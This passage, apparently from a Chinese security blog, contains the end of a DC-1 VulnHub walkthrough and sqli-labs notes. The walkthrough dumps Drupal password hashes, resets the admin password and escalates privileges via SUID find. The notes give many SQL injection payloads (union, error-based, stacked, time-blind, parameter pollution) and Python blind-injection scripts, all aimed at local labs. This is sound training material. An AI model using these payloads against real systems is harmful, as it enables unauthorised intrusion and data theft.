&#39;&#39;,</span><br><span class="line">      &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">      &#39;prefix&#39; &#x3D;&gt; &#39;&#39;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>用python反弹个交互式shell<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p>
<br>

<br>

<h4 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h4><p>顺便得到了数据库信息，登录数据库看看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www&#x2F;sites&#x2F;default$ mysql -u dbuser -p</span><br><span class="line">mysql -u dbuser -p</span><br><span class="line">Enter password: R0ck3t</span><br><span class="line"></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 418639</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and&#x2F;or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and&#x2F;or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use drupaldb</span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables from drupaldb;</span><br><span class="line">  ... ...</span><br><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">| uid | name  | pass                                                    | mail              | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init              | data |</span><br><span class="line">+-----+-------+---------------------------------------------------------+-------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+-------------------+------+</span><br><span class="line">|   0 |       |                                                         |                   |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                   | NULL |</span><br><span class="line">|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia&#x2F;Melbourne |          |       0 | admin@example.com | b:0; |</span><br><span class="line">|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ&#x2F;9TCGg | fred@example.org  |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia&#x2F;Melbourne |          |       0 | fred@example.org  | b:0; |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">drupal密码的加密是破解不出来，需要重置管理的密码(加密脚本位置在网站根目录下的scripts&#x2F;password-hash.sh)</span><br><span class="line">php scripts&#x2F;password-hash.sh admin  (admin是你要设置的新密码)</span><br><span class="line"></span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ php scripts&#x2F;password-hash.sh admin</span><br><span class="line">php scripts&#x2F;password-hash.sh admin</span><br><span class="line"></span><br><span class="line">password: admin                 hash: $S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">去数据库修改密码</span><br><span class="line">mysql&gt; update users set pass &#x3D;&quot;$S$DiOAa4l0lQWNrQKTEfwN1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name&#x3D;&quot;admin&quot;;</span><br><span class="line">&lt;N1erRW769BkBafRIkfVBFRS79BIWF.Vtb&quot; where name&#x3D;&quot;admin&quot;;                      </span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">重置完密码后登录网站 (admin admin)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/7debd13b/DCchallenges1.png"></p>
<br>

<br>

<br>

<p>但是发现当前权限不够</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami </span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<h4 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h4><p>使用<code>find</code>提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ touch dctest        </span><br><span class="line">touch dctest</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec whoami \;</span><br><span class="line">find dctest -exec whoami \;</span><br><span class="line">root</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ whoami</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec ls &#x2F;root \;</span><br><span class="line">find dctest -exec ls &#x2F;root \;</span><br><span class="line">thefinalflag.txt</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ find dctest -exec cat &#x2F;root&#x2F;thefinalflag.txt \;</span><br><span class="line">find dctest -exec cat &#x2F;root&#x2F;thefinalflag.txt \;</span><br><span class="line">Well done!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you&#39;ve enjoyed this and learned some new skills.</span><br><span class="line"></span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br><span class="line">www-data@DC-1:&#x2F;var&#x2F;www$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<br>

<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><blockquote>
<p><a href="https://www.freebuf.com/articles/web/260236.html">https://www.freebuf.com/articles/web/260236.html</a></p>
<p><a href="https://blog.csdn.net/wang_624/article/details/90509951">https://blog.csdn.net/wang_624/article/details/90509951</a></p>
<p><a href="https://f5.pm/go-53516.html">https://f5.pm/go-53516.html</a></p>
<p><a href="https://www.freebuf.com/articles/network/218073.html">https://www.freebuf.com/articles/network/218073.html</a></p>
<p><a href="https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1">https://blog.mzfr.me/vulnhub-writeups/2019-07-12-DC1</a></p>
</blockquote>
]]></content>
      <categories>
        <category>DCchallenges</category>
      </categories>
      <tags>
        <tag>DCchallenges</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs总结</title>
    <url>/posts/6db7f8ba/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs5</title>
    <url>/posts/fdded023/</url>
    <content><![CDATA[<h3 id="54"><a href="#54" class="headerlink" title="54"></a>54</h3><br>

<p><code>id=0&#39; and 1=1 union select 1,2,3 --+</code></p>
<br>

<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3 --+</code></p>
<p>dbs challenges</p>
<p>table qpu4f7zhcb</p>
<p>columns  sessid,secret_6KIK,tryy</p>
<br>

<p><code>id=0&#39; and 1=1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;qpu4f7zhcb&#39;),3 --+</code></p>
<br>

<p>id=0’ and 1=1 union select 1,(select sessid from qpu4f7zhcb limit 0,1),(select secret_6KIK from qpu4f7zhcb limit 0,1)  –+</p>
<br>

<br>

<h3 id="55"><a href="#55" class="headerlink" title="55"></a>55</h3><p><code>)</code>闭合 </p>
<p><code>http://127.0.0.1/sqli-labs/Less-55/?id=0) union select 1,database(),3 --+</code></p>
<p><code>?id=0) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;challenges&#39;),3--+</code></p>
<p><code>?id=0) union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;challenges&#39; and table_name=&#39;8bgb8hj1sk&#39;),3 --+</code></p>
<p>secret_MCQ1</p>
<p><code>id=0) union select 1,(select sessid from 8bgb8hj1sk limit 0,1),(select secret_MCQ1 from 8bgb8hj1sk limit 0,1)  --+</code></p>
<br>

<h3 id="56"><a href="#56" class="headerlink" title="56"></a>56</h3><p><code>&#39;)</code>闭合 方法还是一样的</p>
<br>

<h3 id="57"><a href="#57" class="headerlink" title="57"></a>57</h3><p><code>?id=-1&quot; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code></p>
<br>

<h3 id="58"><a href="#58" class="headerlink" title="58"></a>58</h3><p>使用<code>?id=1 and 1=1 union select 1,2,3</code>无回显</p>
<p>尝试报错注入</p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;y0584eq2pg&#39;),0x7e),1)--+</code></p>
<p><code>?id=0&#39; and updatexml(1,concat(0x7e,(select group_concat(secret_5U2L) from y0584eq2pg),0x7e),1)--+</code></p>
<br>

<h3 id="59"><a href="#59" class="headerlink" title="59"></a>59</h3><p>数字型 和58一样</p>
<p><code>?id=0 and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><p>用<code>&quot;)</code>闭合 和58一样</p>
<br>

<h3 id="61"><a href="#61" class="headerlink" title="61"></a>61</h3><p>用<code>&#39;))</code>闭合</p>
<p><code>?id=0&#39;)) and updatexml(1,concat(0xs7e,database(),0x7e),1)--+</code></p>
<br>

<h3 id="62"><a href="#62" class="headerlink" title="62"></a>62</h3><p>用<code>&#39;)</code>闭合 这关没回显 使用时间盲注</p>
<p>根据前面几关可以得到</p>
<p>数据库为 challenges</p>
<p>table 是随机10为字符组成</p>
<p>column是secret_ 和四位随机字符组成 </p>
<p>本关限制重置次数为130次，可以写个python脚本试一下</p>
<br>

<br>

<p><code>?id=1&#39;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
<p><code>?id=1&#39;) and ascii(substr((select group_concat(column_name) from information_schema.tables where table_schema=database() and table_name=&#39;8mdr4weo2b&#39;),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查表名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):  <span class="comment">#已知表长为10</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]           <span class="comment">#二分法判断</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select group_concat(table_name) from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:   <span class="comment">#Angelina是正常页面下的结果</span></span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查字段</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   </span><br><span class="line"></span><br><span class="line"><span class="comment"># 字段为secret_XXXX</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">12</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        m = payloads[mid]  <span class="comment"># 二分法判断</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select column_name from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.columns where table_name=&#x27;eu3ls8m6rg&#x27; limit 2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    print(<span class="string">&#x27;secret_&#x27;</span>+data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="63"><a href="#63" class="headerlink" title="63"></a>63</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>方法同62</p>
<br>

<h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>方法同62</p>
<br>

<h3 id="65"><a href="#65" class="headerlink" title="65"></a>65</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>方法同62</p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux虚拟机在NAT模式下主机ping不通虚拟机</title>
    <url>/posts/ccb4aa11/</url>
    <content><![CDATA[<p>原因:本机的VMware Network Adapter VMnet8的和虚拟机设置的网段不一样</p>
<p>设置网络适配器与虚拟机的网段一致，之后便可以ping通</p>
<p>如果网段一致，就重新启动下网卡（禁用后再启动即可）</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs4</title>
    <url>/posts/8ad9e0b5/</url>
    <content><![CDATA[<h3 id="42-堆叠注入"><a href="#42-堆叠注入" class="headerlink" title="42 堆叠注入"></a>42 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$con1</span> = mysqli_connect(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line">   </span><br><span class="line">... ... </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>只对username做了处理，对password没有处理</p>
<p><code>login_user=admin&amp;login_password=1%27%3Bcreate+table+test44 like users%23&amp;mysubmit=Login</code></p>
<br>

<h3 id="43-堆叠注入"><a href="#43-堆叠注入" class="headerlink" title="43 堆叠注入"></a>43 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$con1</span> = mysqli_connect(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$username</span>&#x27;) and password=(&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>和上一关差不多，使用<code>&#39;)</code>闭合</p>
<br>

<h3 id="44-堆叠注入"><a href="#44-堆叠注入" class="headerlink" title="44 堆叠注入"></a>44 堆叠注入</h3><p>和42一样</p>
<br>

<h3 id="45-堆叠注入"><a href="#45-堆叠注入" class="headerlink" title="45 堆叠注入"></a>45 堆叠注入</h3><p>和43一样</p>
<br>

<h3 id="46-order-by注入"><a href="#46-order-by注入" class="headerlink" title="46 order by注入"></a>46 <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>使用<code>?sort=1%20desc</code>或者<code>?sort=1%20asc</code> 数据不同，可以使用报错注入</p>
<p><code>?sort=1 updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
<br>

<p>也可以使用时间盲注</p>
<p><code>?sort=1 and if(1=1,sleep(1),0)</code>会响应一段时间</p>
<p><code>?sort=1 and if(1=1,0,sleep(1))</code> 会即可得到信息</p>
<br>

<br>

<h3 id="47-order-by注入"><a href="#47-order-by注入" class="headerlink" title="47  order by注入"></a>47  <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?sort=1&#39; desc --+</code>   <code>?sort=1&#39; asc --+</code></p>
<p><code>?sort=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<br>

<h3 id="48-order-by注入"><a href="#48-order-by注入" class="headerlink" title="48 order by注入"></a>48 <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>可以参考46</p>
<p>这关没回显，考虑使用时间盲注</p>
<br>

<p>SQlmap</p>
<p><code>python sqlmap.py -u 192.168.56.1/sqli-labs/Less-48/?sort=1  --technique T --batch --dbs</code></p>
<br>

<h3 id="49-order-by注入"><a href="#49-order-by注入" class="headerlink" title="49 order by注入"></a>49 <code>order by</code>注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?sort=1%27%20%20and%20sleep(1)--+</code>时间盲注</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u 192.168.56.1/sqli-labs/Less-49/?sort=1  --technique T --batch --dbs</code></p>
<br>

<h3 id="50-order-by注入-amp-堆叠注入"><a href="#50-order-by注入-amp-堆叠注入" class="headerlink" title="50 order by注入&amp;堆叠注入"></a>50 <code>order by</code>注入&amp;堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line">	<span class="comment">/* execute multi query */</span></span><br><span class="line">	<span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">	... ...</span><br></pre></td></tr></table></figure>

<p>order by注入和堆叠注入</p>
<p>数字型 可以使用时间盲注和报错注入</p>
<p><code>?sort=1%20and%20sleep(1)</code></p>
<p><code>?sort=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
<br>

<p>堆叠注入</p>
<p><code>?sort=1;insert into users(id,username,password) values(&#39;50&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="51-order-by注入-amp-堆叠注入"><a href="#51-order-by注入-amp-堆叠注入" class="headerlink" title="51 order by注入&amp;堆叠注入"></a>51 <code>order by</code>注入&amp;堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>)) </span><br></pre></td></tr></table></figure>

<p>报错注入</p>
<p><code>?sort=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<p>堆叠注入</p>
<p><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;51&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="52-order-by注入-amp-堆叠注入"><a href="#52-order-by注入-amp-堆叠注入" class="headerlink" title="52 order by注入&amp;堆叠注入"></a>52 <code>order by</code>注入&amp;堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br></pre></td></tr></table></figure>

<br>

<p>堆叠注入</p>
<p><code>?sort=1;insert into users(id,username,password) values(&#39;52&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<br>

<h3 id="53-order-by注入-amp-堆叠注入"><a href="#53-order-by注入-amp-堆叠注入" class="headerlink" title="53 order by注入&amp;堆叠注入"></a>53 <code>order by</code>注入&amp;堆叠注入</h3><p>堆叠注入</p>
<p><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;53&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs3</title>
    <url>/posts/14bd7516/</url>
    <content><![CDATA[<h3 id="29-参数污染"><a href="#29-参数污染" class="headerlink" title="29 参数污染"></a>29 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ... ... </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);   <span class="comment">//用`&amp;`分割字符串</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);     <span class="comment">//截取前两位字符</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)              </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;                  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 用&amp;分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">explode(separator,string,limit) 函数把字符串打散为数组。</span><br><span class="line">separator 必需。规定在哪里分割字符串。</span><br><span class="line">string 必需。要分割的字符串。</span><br><span class="line">limit 可选。规定所返回的数组元素的数目。可能的值：</span><br><span class="line">    大于 0 - 返回包含最多 limit 个元素的数组</span><br><span class="line">    小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组</span><br><span class="line">    0 - 返回包含一个元素的数组</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>对于<code>login.php?id=1&amp;id=2</code> apache(php)会解析最后一个参数，tomcat(jsp)会解析第一个参数，第一个<code>id</code>会经过<code>whitelist()</code>和<code>java_implimentation()</code></p>
<p><code>whitelist()</code>作用是传入的参数必须是一位及以上的数字</p>
<p><code>java_implimentation()</code>用<code>&amp;</code>分割字符串为两部分，然后进行数组遍历，如果字符前两位为id，那么返回它的3-30位字符</p>
<p>参数污染 <code>id=1 &amp; id=0&#39; union select 1,2,&#39;3</code></p>
